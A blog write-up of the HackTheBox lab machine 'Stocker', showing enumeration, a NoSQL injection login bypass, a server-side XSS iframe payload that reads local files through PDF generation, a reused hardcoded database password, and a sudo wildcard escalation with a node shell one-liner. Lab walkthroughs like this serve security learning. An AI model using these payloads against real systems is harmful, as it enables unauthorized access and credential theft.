---
layout: post
title: "HTB: Stocker"
date: 2023-02-05
keywords: "HTB, HackTheBox, Stocker, Easy"
categories: [HTB Machines]
tags: [CTF, HTB, HTB-Easy]
---

## Intro

**Stocker** is an *Easy* HackTheBox machine covering a NodeJS Web application exploit and a SUDO privesk esploiting wildcard.

## Enumeration

To begin with this machine, I went directly to the browser in order to confirm if there is a Web server.

![](blog/htb_m/Stocker/Pasted image 20230205124321.png)

It looks like there is one and it's trying to redirect me to the hostname `stocker.htb`.
To fix the DNS resolving issue, I added the box's IP and the hostname it's redirecting us to my `/etc/hosts` file.

```bash
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

#HTB_Boxes
10.10.11.189    precious.htb
10.10.11.196    stocker.htb
```
{: file="/etc/hosts"}

A page reload showed the page behind the server.

![](blog/htb_m/Stocker/Pasted image 20230205124914.png)

I also ran a Nmap scan to gain a better understanding and overview of the server.

```bash
$ sudo nmap -sSCV -A -O -T4 -oN nmap.scan 10.10.11.196
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-05 07:52 EST
Nmap scan report for stocker.htb (10.10.11.196)
Host is up (0.016s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d12971d86bc161683608f4f06e6d54e (RSA)
|   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)
|_  256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Stock - Coming Soon!
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-generator: Eleventy v2.0.0
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=2/5%OT=22%CT=1%CU=35431%PV=Y%DS=2%DC=T%G=Y%TM=63DFA69C
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST11
OS:NW7%O6=M539ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT      ADDRESS
1   13.65 ms 10.10.14.1
2   13.81 ms stocker.htb (10.10.11.196)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.23 seconds
```

In that case, there were only two ports open:
- **22 SSH**
- **80 HTTP**

Now, going back to the Web server, can be noted that the page is under development.

![](blog/htb_m/Stocker/Pasted image 20230205135211.png)

It can be concluded that there would be either a:
- Hidden **Subdirectory**
- Hidden **Subdomain**

To fuzz the page, I used Dirb and FuFF.

Fuzzing for **Directory**:

```bash
$ dirb http://stocker.htb > dir.scan
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Feb  5 09:02:43 2023
URL_BASE: http://stocker.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://stocker.htb/ ----
==> DIRECTORY: http://stocker.htb/css/                                                                                                                                                                                                     
+ http://stocker.htb/favicon.ico (CODE:200|SIZE:1150)                                                                                                                                                                                      
==> DIRECTORY: http://stocker.htb/fonts/                                                                                                                                                                                                   
==> DIRECTORY: http://stocker.htb/img/                                                                                                                                                                                                     
+ http://stocker.htb/index.html (CODE:200|SIZE:15463)                                                                                                                                                                                      
==> DIRECTORY: http://stocker.htb/js/                                                                                                                                                                                                      
                                                                                                                                                                                                                                           
---- Entering directory: http://stocker.htb/css/ ----
                                                                                                                                                                                                                                           
---- Entering directory: http://stocker.htb/fonts/ ----
                                                                                                                                                                                                                                           
---- Entering directory: http://stocker.htb/img/ ----
                                                                                                                                                                                                                                           
---- Entering directory: http://stocker.htb/js/ ----
                                                                                                                                                                                                                                           
-----------------
END_TIME: Sun Feb  5 09:09:25 2023
DOWNLOADED: 23060 - FOUND: 2
```

Fuzzing for **Subdomain (*Virtual Host*)**:

> Running the scan by simply putting `... -u FUZZ.stocker.htb` would not work as the subdomain is not linked to the IP in the `/etc/hosts` file.
> Furthermore, you can't specify a wildcard (`*.stocker.htb`).
{: .prompt-info }

```bash
$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.stocker.htb" -u http://stocker.htb/ -mc 200,302 > vhost.scan

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://stocker.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.stocker.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,302
________________________________________________

dev                     [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 27ms]
:: Progress: [4989/4989] :: Job [1/1] :: 2365 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

After finding the subdomain, I added it to the `/etc/hosts`:

```bash
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

#HTB_Boxes
10.10.11.189    precious.htb
10.10.11.196    stocker.htb dev.stocker.htb
```
{: file="/etc/hosts"}

## Initial Access (NO User Privilage Escalation)

After testing the login page for SQLi and XSS, I proceeded to NoSQLi.

With the help of BurpSute, I used the first payload from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#authentication-bypass) and changed the `Content-Type` to `application/json`.

```http
POST /login HTTP/1.1
Host: dev.stocker.htb
Content-Length: 19
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://dev.stocker.htb
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://dev.stocker.htb/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: connect.sid=s%3AiPexV9Wf9Ef0iYz7ImnEZw4tQtQzn_mC.il8l9KEIIk2AUPN%2F1iA0dyq5c5rZeu%2FyynAjRCny%2FKE
Connection: close

{"username": {"$ne": null}, "password": {"$ne": null}}
```

![](blog/htb_m/Stocker/Pasted image 20230205143936.png)

Success!

![](blog/htb_m/Stocker/Pasted image 20230205144018.png)

It appears there is some exposed JS in the source of the page:

```javascript
    const $ = (selector) => document.querySelector(selector);

    const basket = [];

    let productStore = [];

    const cartModalElement = $("#cart-modal");
    const cartModal = new bootstrap.Modal(cartModalElement);

    fetch("/api/products")
      .then((response) => response.json())
      .then((products) => {
        productStore = products;
        const template = $("#product-template");

        products.forEach((product) => {
          const clone = template.content.cloneNode(true);
          const $$ = (selector) => clone.querySelector(selector);

          $$(".item-title").textContent = product.title;
          $$(".item-description").textContent = product.description;
          $$(".item-price").textContent = `£${product.price.toFixed(2)}`;
          $$(".item-stock").textContent = `${product.currentStock} In Stock`;
          $$(".item-image").setAttribute("src", `/static/img/${product.image}`);
          $$(".add-to-basket").setAttribute("product-id", product._id);

          $("#item-container").appendChild(clone);
        });

        Array.from(document.querySelectorAll(".add-to-basket")).forEach((button) => {
          button.addEventListener("click", () => {
            const product = productStore.find((product) => product._id === button.getAttribute("product-id"));

            if (!product) return;

            const existing = basket.find((basketItem) => basketItem._id === product._id);
            if (existing) {
              existing.amount++;
            } else {
              basket.push({ ...product, amount: 1 });
            }

            alert("Added to basket!");
            console.log(basket);
          });
        });
      });

    const beforePurchase = $("#before-purchase");
    const afterPurchase = $("#after-purchase");
    const cartTable = $("#cart-table");
    const submitPurchase = $("#submit-purchase");

    const purchaseOrderLink = $("#purchase-order-link");

    cartModalElement.addEventListener("show.bs.modal", () => {
      beforePurchase.style.display = "";
      afterPurchase.style.display = "none";

      document.querySelectorAll(".basket-item").forEach((item) => item.remove());

      const template = $("#basket-template");

      basket.forEach((basketItem) => {
        const clone = template.content.cloneNode(true);

        const $$ = (selector) => clone.querySelector(selector);

        $$(".item-name").textContent = basketItem.title;

        $$(".item-quantity").textContent = basketItem.amount;
        $$(".item-price").textContent = `£${basketItem.price.toFixed(2)}`;

        cartTable.prepend(clone);
      });

      $("#cart-total").textContent = basket
        .map((x) => x.price * x.amount)
        .reduce((a, b) => a + b, 0)
        .toFixed(2);

      if (basket.length > 0) {
        submitPurchase.style.display = "";
      } else {
        submitPurchase.style.display = "none";
      }
    });

    submitPurchase.addEventListener("click", () => {
      fetch("/api/order", {
        method: "POST",
        body: JSON.stringify({ basket }),
        headers: {
          "Content-Type": "application/json",
        },
      })
        .then((response) => response.json())
        .then((response) => {
          if (!response.success) return alert("Something went wrong processing your order!");

          purchaseOrderLink.setAttribute("href", `/api/po/${response.orderId}`);

          $("#order-id").textContent = response.orderId;

          beforePurchase.style.display = "none";
          afterPurchase.style.display = "";
          submitPurchase.style.display = "none";
        });
    });
```

Looking closer into the second part of the code, we can see that:

* When submitting an order, a POST API call is made to `/api/order`. The POST request has a JSON body containing the values stored in the `basket` variable. 

```javascript
.
.
.

submitPurchase.addEventListener("click", () => {
    fetch("/api/order", {
	    method: "POST",
        body: JSON.stringify({ basket }),
        headers: {
		    "Content-Type": "application/json",
	    },
	})
```

![](blog/htb_m/Stocker/Pasted image 20230205163422.png)

* Then, the result from the response is taken. A check for the success of the response is made. If the response is different from `success`, then the rest of the code won't be executed.

```javascript
	.then((response) => response.json())
	.then((response) => {
		if (!response.success) return alert("Something went wrong processing your order!");
```

![](blog/htb_m/Stocker/Pasted image 20230205164101.png)

* However, on success, the value of the variable `purchaseOrderLink` is set to `/api/po/<OrderID>`.

```javascript
		purchaseOrderLink.setAttribute("href", `/api/po/${response.orderId}`);

		$("#order-id").textContent = response.orderId;

	    beforePurchase.style.display = "none";
	    afterPurchase.style.display = "";
	    submitPurchase.style.display = "none";
    });
});
```

![](blog/htb_m/Stocker/Pasted image 20230205164553.png)

This link point to a *dynamically generated PDF* with the order details.

![](blog/htb_m/Stocker/Pasted image 20230205164721.png)

>## Server Side XSS (Dynamic PDF)
>
>If a web page is creating a PDF using user controlled input, you can try to **trick the bot** that is creating the PDF into **executing arbitrary JS code**. So, if the **PDF creator bot finds** some kind of **HTML** **tags**, it is going to **interpret** them, and you can **abuse** this behaviour to cause a **Server XSS**.
{: .prompt-info }

[**SOURCE**](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf)

Now that we know that there "might" be a server-side XSS, we need to see which values from the POST API calls are used for the PDF generation.

![](blog/htb_m/Stocker/Pasted image 20230205170445.png)

So, we can try using either the `title` or `price` parameters.

In my case, I tried both, by using the [**Read local file**](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf#read-local-file) `iframe` payload provided by [*HackTricks*](https://book.hacktricks.xyz/).

```html
<iframe src=file:///etc/passwd></iframe>
```

![](blog/htb_m/Stocker/Pasted image 20230205171003.png)

And it looks like the `title` parameter can be exploited due to the lack of sanitisation. Furthermore, the success of the use of the `file:` parameter indicates the exploit of *Server-Side XSS* and [*SSRF (Server Side Request Forgery)*](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery).

After repeating the steps from above and editing the payload to expend the `iframe` for better readability (`height=1000px width=1000px`), I was able to read the username.

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin
landscape:x:109:116::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
fwupd-refresh:x:112:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
mongodb:x:113:65534::/home/mongodb:/usr/sbin/nologin
angoose:x:1001:1001:,,,:/home/angoose:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```
{: file="/etc/passwd"}

After exploring around, I stumbled on the `index.js` source code.

```html
<iframe src=file:///var/www/dev/index.js height=1000px width=1000px></iframe>
```

There I found the MongoDB credentials:

![](blog/htb_m/Stocker/Pasted image 20230205174319.png)

```javascript
// TODO: Configure loading from dotenv for production
const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";
```

And finally, due to not loading credentials from dotenv and password reuse, I  got SSH access to user `angoose`.

```bash
$ ssh angoose@stocker.htb                    
The authenticity of host 'stocker.htb (10.10.11.196)' can't be established.
ED25519 key fingerprint is SHA256:jqYjSiavS/WjCMCrDzjEo7AcpCFS07X3OLtbGHo/7LQ.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'stocker.htb' (ED25519) to the list of known hosts.
angoose@stocker.htb's password: 
Last login: Sun Feb  5 16:49:24 2023 from 10.10.14.52
-bash-5.0$ id
uid=1001(angoose) gid=1001(angoose) groups=1001(angoose)
-bash-5.0$ cat user.txt 
cf901f8fe560505899ed37d6ba998c19
```

## Root Privilage Escalation

Running `sudo -l` and entering the password shows that `/usr/bin/node /usr/local/scripts/*.js` can be executed.

```bash
$ sudo -l
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
```

Setting SUDO permissions with wildcard could lead to potential vulnerabilities, like in this case.

For the sace of not interfiering with other palyers, I made a folder in `/tmp` and made a JS file in which I pasted a line of JS which spawns a shell.

```bash
$ pwd
/tmp/.niik
$ cat root.js 
require("child_process").spawn("/bin/bash", ["-p"], {stdio: [0, 1, 2]})
$ sudo /usr/bin/node /usr/local/scripts/../../../tmp/.niik/root.js 
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt 
37867fe058775c692ccf699e2499edb3
```

```javascript
require("child_process").spawn("/bin/bash", ["-p"], {stdio: [0, 1, 2]})
```

[**SOURCE**](https://gtfobins.github.io/gtfobins/node/#suid)

---
# Referemce List

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#authentication-bypass  
https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf  
https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery  
https://gtfobins.github.io/gtfobins/node/#suid  
